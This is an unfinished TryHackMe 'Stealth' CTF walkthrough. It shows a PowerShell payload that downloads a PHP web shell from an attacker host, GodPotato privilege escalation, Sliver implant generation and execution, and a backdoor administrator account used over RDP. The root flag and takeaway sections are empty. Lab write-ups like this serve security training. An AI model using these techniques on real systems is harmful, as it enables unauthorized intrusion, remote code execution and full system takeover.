# 🧠 TryHackMe Room: Stealth

**Room URL:** [https://tryhackme.com/room/stealth](https://tryhackme.com/room/stealth)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Overview  

**Objective:**  
This guide walks through solving the Stealth room. This challenge involves initial exploitation of a web upload vulnerability. Once initial access has been gained privilege escalation is achieved via exploiting the SeImpersonatePrivilege to gain full administrator access.
This rooms initial access portion challenged me, and I had to get some guidance to understand the correct approach, it looked like a simple upload vulnerability at first but needed some clever tricks to take full advantage of. Once initial access had been gained I had wanted to create a sliver session with GodPotato to escalate my privileges but ran into issues with my Sliver `NT AUTHORITY\SYSTEM` shell constantly breaking, as such I reverted to a different tactic. I have kept the Sliver details in the guide to show my thought process.

---

## 🧰 Tools I Used  
- RustScan  
- nmap  
- dirsearch
- Caido
- P0wny-shell - [https://github.com/flozz/p0wny-shell/tree/master](https://github.com/flozz/p0wny-shell/tree/master)
- GodPotato - [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- Sliver
- CyberChef
- FreeRDP


---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. We can also either start the AttackBox or as in my case connect our own machine to the TryHackMe VPN.  If needed, you can add ```stealth.thm``` along with the assigned IP to your ```/etc/hosts``` file which can make life easier than remembering an IP all the time.  

---

## 🛠️ Recon & Enumeration 

As always, I started out with some simple port and directory scans against the target. Even though the room indicates we need to start at port `8080` in our browser, it is always good to get a lay of the land regarding other running services and open ports.   

I ran RustScan as shown below.  
```bash
rustscan -a stealth.thm -- -A
```
#### ⚙️ **Options**   
**-a** Use to list the IPs, CIDRs or hosts to be scanned.  
**-A** Passes the IP and open ports to nmap to perform a full `-A` nmap scan.   
Note that we need to add the double dash `--` after the IP to tell RustScan that the following arguments should be passed to nmap. In this instance `-A`  

The result returned alof of information, some of which I have taken out to clean up the output.  
```js
PORT      STATE SERVICE       REASON          VERSION
139/tcp   open  netbios-ssn   syn-ack ttl 124 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 124
3389/tcp  open  ms-wbt-server syn-ack ttl 124 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSTEVASION
|   NetBIOS_Domain_Name: HOSTEVASION
|   NetBIOS_Computer_Name: HOSTEVASION
|   DNS_Domain_Name: HostEvasion
|   DNS_Computer_Name: HostEvasion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-01T01:59:43+00:00
|_ssl-date: 2025-10-01T02:00:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HostEvasion
| Issuer: commonName=HostEvasion
5985/tcp  open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          syn-ack ttl 124 PHP cli server 5.5 or later
8080/tcp  open  http          syn-ack ttl 124 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
8443/tcp  open  ssl/http      syn-ack ttl 124 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
47001/tcp open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
```
The main items to note for the challenge here are  
- RDP on port `3389`  
- HTTP on port `8080`  
- HTTP on port `8000`

And the computer name `HostEvasion` which can be added to our `/etc/hosts` file.  

Next, I ran dirsearch against the target as below. 
```bash
dirsearch -u http://stealth.thm:8080   
```
#### ⚙️ **Options**   
**-u** Use to list the IPs, CIDRs or hosts to be scanned.  
Note that dirsearch has a default wordlist that will be used if no specific wordlist is provided. This wordlist is comparable to notable lists in finding directories.  


```js
[12:14:29] 301 -  344B  - /uploads  ->  http://stealth.thm:8080/uploads/    
[12:14:29] 200 -    0B  - /uploads/
```
This just gave us one new directory of `/uploads` 

I did run a few other scans via ffuf but this did not turn up anything new.  

Now we can check `http://stealth:8080` via our browser. Here we are presented with a basic file upload box, which mentions only `.ps1` files can be loaded and their contents will be scanned.  
![Recon - website.png](./Images/Recon%20-%20website.png)  

I firstly just loaded a simple file with `Hello World` and tried to view what is happening with Caido.  
```bash
echo "Hello World" > file.ps1
```
This could be uploaded without error and when I navigated to `/uploads/file.ps1` the output was returned in the servers HTTP response.  
![Recon - Caido.png](./Images/Recon%20-%20Caido.png)  

At this stage I attempted up upload simple commands like `/whoami` but everything the content of my file was just being output back to be in the HTTP response. I then turned to try bypass the `.ps1` filter and upload a PHP reverse shell.  
I was successfully able to bypass the filter as it was only employing Client-Side filtering which was easily bypassed by editing my upload request in Caido. 

This still did not provide me with any luck, and this is where I got stuck and had to do some research as to how others managed to gain initial access.  

---

## 🛠️ Initial Access

After some research what I learnt was that the contents of the `.ps1` files being uploaded was being scanned and then also executed with the results being blind. Other users where able to quite cleverly I thought get simple commands to execute, have the output sent back to their attacking machine in the body of a HTTP POST. This request as captured via a netcat listener. The guide I found this in can be seen in the appendix.  

The big trick I was missing is that because the `.ps1` files are being executed, we can use them to copy a web shell onto the target in the `C:\xampp\htdocs\` directory.

Firstly, I needed to download a copy of a web shell, and I used the one here - [P0wny-shell](https://github.com/flozz/p0wny-shell/tree/master)  

Now I needed to create a `.ps1` file to load the web shell onto the target.
```powershell
$url = "http://10.4.12.97:5050/shell.php"
$localPath = "C:\xampp\htdocs\shell.php"
Invoke-WebRequest -Uri $url -OutFile $localPath
```
This sets the location of the `shell.php` file to download as the `$url` parameter and the output location and name of the file as the `$localPath` parament and then issues `Invoke-WebRequest` to grab the file.  

Before uploading our `.ps1` file we need to start a HTTP server to allow the target to download the webshell file.
```bash
python3 -m http.server 5050
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.36.254 - - [01/Oct/2025 20:23:01] "GET /shell.php HTTP/1.1" 200 -
```
If everything was setup correctly the web shell file should have been loaded onto the target.  

As a quick summary what is happening here is we create a `.ps1` file say called `shellloader.ps1` and another file for our web shell called `shell.php` we then upload `shellloader.ps1` to the website which is scanned and executed. When this executes it downloads the `shell.php` file and saves it in `C:\xampp\htdocs\shell.php` we can then navigate directly to the `shell.php` location in the browser and gain web shell access to the target.  

![Initial Access.png](./Images/Initial%20Access.png)  

Once on the target we can see that we are the user `evader` on `HostEvasion`  

I undertook some simple recon here to determine privileges and before looking for the user flag decided to move onto privilege escalation as our user had the `SeImpersonatePrivilege` which can be quickly abused via different Potato attacks.  

---

## 🛠️ Privilege Escalation

First, we need to select our chosen potato and, in my case, I went with GodPotato found here: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) I downloaded the `GodPotato-Net4.exe` to match the target system.  
Once downloaded I renamed the file and made it executable
```bash
mv GodPotato-NET4.exe potato.exe
chmod +x Potato.exe
```
Now we can transfer this file to the target via the web shell and a HTTP server on our machine.  
```bash
evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/potato.exe -outfile potato.exe
```
```bash
python3 -m http.server 5050     
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.104.177 - - [03/Oct/2025 20:26:07] "GET /potato.exe HTTP/1.1" 200 -
```

Now we can execute a simple test `whoami` to confirm we can use GodPotato to escalate via the following syntax `.\potato.exe -cmd "cmd /c whoami"`
```cmd
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "cmd /c whoami"
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2252
```
Success we can execute commands as `NT AUTHORITY\SYSTEM`

At this stage my plan was to use GodPotato to execute a Sliver implant on the target and gain a Sliver session as `NT AUTHORITY\SYSTEM` which ultimately did not work out as planned. Hence why I pivoted to creating a new user in the admin group and logging in via RDP.    

### 🛰️ Sliver Method

Here I briefly detail the steps I took to gain a Sliver session as `NT AUTHORITY\SYSTEM` on the target and the issues I ran into. If you just want to get the flags and complete the challenge you can view the **User Creation and RDP Method**  

First start Sliver
```bash
┌──(machonachos㉿kali)-[~]
└─$ sudo systemctl start sliver

┌──(machonachos㉿kali)-[~]
└─$ sliver                     
Connecting to localhost:31337 ...

sliver >  
```
Once Sliver is up and running an implant needs to be generated for the target system. Note it is useful to compile new implants as they are dynamically compiled with per-binary asymmetric encryption keys.  
```console
sliver > generate --mtls 10.4.12.97:9001 --os windows --format exe --save ~/THMCTF/data.exe

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 47s
[*] Implant saved to /home/machonachos/THMCTF/data.exe
```
Now setup an matching listener in Sliver.
```console
sliver > mtls -L 10.4.12.97 -l 9001

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 1    mtls   tcp        9001                 
```
Now to transfer the created implant `data.exe` to the target via a HTTP Server
```bash
evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/data.exe -outfile data.exe
```
```bash
python3 -m http.server 5050
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.104.177 - - [03/Oct/2025 20:36:45] "GET /data.exe HTTP/1.1" 200 -
```

Now to execute the implant we can use GodPotato to execute it as `NT AUTHORITY\SYSTEM`
```cmd
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd ".\data.exe"
```
This should trigger a session in Sliver as `NT AUTHORITY\SYSTEM`
```console
[*] Session 6c1d11e1 EFFECTIVE_SODA - 10.201.104.177:49784 (HostEvasion) - windows/amd64 - Fri, 03 Oct 2025 20:39:02 AEST
sliver > sessions

 ID         Transport   Remote Address         Hostname      Username              Operating System   Health  
========== =========== ====================== ============= ===================== ================== =========
 6c1d11e1   mtls        10.201.104.177:49784   HostEvasion   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
```

We can now use this session to interact with the target and try gain shell access.
```console
sliver > sessions -i 6c1d11e1

[*] Active session EFFECTIVE_SODA (6c1d11e1)

sliver (EFFECTIVE_SODA) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 6120
```

Here is where I ran into issues and the shell would just constantly break and exit as soon as I tried to interact with it.  
![Compuer Says No Gif](https://www.bigfooty.com/forum/media/computer-says-no-carol-beer-gif.146670/full)

I was thinking it is possibly due to Defender/AMSI not liking something about the way the shell process has been initiated on the target using `NT AUTHORITY\SYSTEM` I had no issues doing the same as the `evader` user and could interact with the shell no problems. 

Anyway, as such I moved onto the second method which I was confident would work as a backup, detailed below.  

---

### 🖥️ User Creation and RDP Method

The goal for this method is to use GodPotato to add a new user onto the target into the administrators group. We can then use the open RDP port to gain a session as this new user.

The below command will be used to create a new user called `tester` with a password of `Password123`.
```cmd
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net user tester Password123 /add"
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 828
The command completed successfully.
```
This can sometimes error due to password policy requirements, and you may need to adjust the password and try again.  
In this instance we look to have been successful, but we can double check via the below. 
```cmd
evader@HostEvasion:C:\xampp\htdocs# net users

User accounts for \\HOSTEVASION

-------------------------------------------------------------------------------
Administrator            DefaultAccount           evader
Guest                    tester                   WDAGUtilityAccount
The command completed successfully.
```
Now to add the `tester` user to the administrators group on the target.
```cmd
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net localgroup administrators tester /add"
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2592
The command completed successfully.
```
Success again and this can be confirmed below.  
```cmd
evader@HostEvasion:C:\xampp\htdocs# net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
tester
The command completed successfully.
```

Now that our new user has been all setup we can use FreeRDP to access the target via open port `3389`  
```bash
xfreerdp3 /v:HostEvasion /u:tester /p:Password123
```
This should pop open a new window and after a moment load you into the target via the GUI as the user `tester`  
![RDP - start.png](./Images/RDP%20-%20start.png)  

Now we can hunt down the flags and complete the challenge.  

---

## 🎌 Flags

I first tried to grab the flags via PowerShell with the below code which I came across in the guide linked in the appendix.    
```powershell
Get-ChildItem C:\Users -Recurse | Select-String "THM{"
```

But as this machine has UAC enabled, I could not accept the popup when this script was trying to search the `Administrator` folder via CLI. There are ways to bypass UAC when using the CLI, but that was not necessary in this instance.  

---

### 🚩 User Flag 

Navigate manually to the Desktop folder of `evader` at `C:\Users\evader\Desktop` 
But there is no flag, just a file called `encodedflag`  
![RDP - Encodedflag.png](./Images/RDP%20-%20Encodedflag.png)  


### 🏴‍☠️ Root Flag


---

## 🧠 Takeaways  


---

Thank you for following through my guide of the TryHackMe Stealth room.


### Appendices
Guide I referenced when stuck:  [TryHackMe Stealth Walkthrough by Rich](https://happycamper84.medium.com/tryhackme-stealth-walkthrough-ea84fcf54b8b) They have some other great resources on their blog which I will certainly utilise in the future.  
